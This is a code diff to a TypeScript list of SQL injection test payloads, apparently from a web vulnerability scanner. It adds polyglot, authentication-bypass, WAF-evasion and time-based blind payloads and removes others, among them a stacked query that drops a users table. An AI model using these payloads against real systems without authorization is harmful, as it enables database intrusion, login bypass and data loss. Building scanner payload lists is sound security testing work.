@@ -93,29 +93,34 @@ export function detectSqlInjection(response: CrawlResponse): PatternMatch[] {
 }
 
 // SQL injection test payloads
+// SQL injection test payloads
 export const SQLI_PAYLOADS = [
+    // Polyglots (High Efficiency)
+    { payload: "javascript:/*</title>*/\"/*//*/'/*//\"/*--></script>1' OR 1=1--", purpose: 'Universal Polyglot' },
+    { payload: "1';SELECT * FROM information_schema.tables;", purpose: 'Generic Information Leak' },
+
+    // Auth Bypass
+    { payload: "' OR '1'='1' -- ", purpose: 'Auth Bypass (Standard)' },
+    { payload: "admin' --", purpose: 'Admin user injection' },
+    { payload: "admin' #", purpose: 'Admin user injection (MySQL)' },
+
     // Error-based
     { payload: "'", purpose: 'Single quote - basic error test' },
-    { payload: "''", purpose: 'Double single quote - escape test' },
     { payload: '"', purpose: 'Double quote - error test' },
     { payload: '`', purpose: 'Backtick - MySQL specific' },
-    { payload: "' OR '1'='1", purpose: 'Classic OR injection' },
-    { payload: "' OR '1'='1' --", purpose: 'OR with comment' },
-    { payload: "' OR '1'='1' #", purpose: 'OR with MySQL comment' },
-    { payload: "1' ORDER BY 1--", purpose: 'Column count test' },
-    { payload: "1' ORDER BY 10--", purpose: 'Column count test (high)' },
-    { payload: "' UNION SELECT NULL--", purpose: 'UNION injection test' },
-    { payload: "' UNION SELECT NULL,NULL--", purpose: 'UNION 2 columns' },
-    { payload: "'; SELECT SLEEP(5)--", purpose: 'Time-based blind (MySQL)' },
+    { payload: "') OR ('1'='1", purpose: 'Parenthesis bypass' },
+
+    // WAF Bypass / Obfuscation
+    { payload: "/*!50000SELECT*/ 1", purpose: 'MySQL Comment obfuscation' },
+    { payload: "UnIoN/+SeLeCT", purpose: 'Case variation + whitespace bypass' },
+    { payload: "%27%20OR%201=1--", purpose: 'URL Encoded OR' },
+
+    // Time-based (Safe)
+    { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", purpose: 'Time- based (MySQL Safe)' },
     { payload: "'; WAITFOR DELAY '0:0:5'--", purpose: 'Time-based blind (MSSQL)' },
+    { payload: "') AND SLEEP(5)--", purpose: 'Time- based (Parenthesis)' },
+
+    // Boolean-based
     { payload: "' AND 1=1--", purpose: 'Boolean-based blind (true)' },
     { payload: "' AND 1=2--", purpose: 'Boolean-based blind (false)' },
-
-    // Integer-based
-    { payload: '1 OR 1=1', purpose: 'Integer OR injection' },
-    { payload: '1 AND 1=1', purpose: 'Integer AND true' },
-    { payload: '1 AND 1=2', purpose: 'Integer AND false' },
-
-    // Stacked queries
-    { payload: "'; DROP TABLE users--", purpose: 'Stacked query test (DO NOT USE IN PROD)' },
 ];
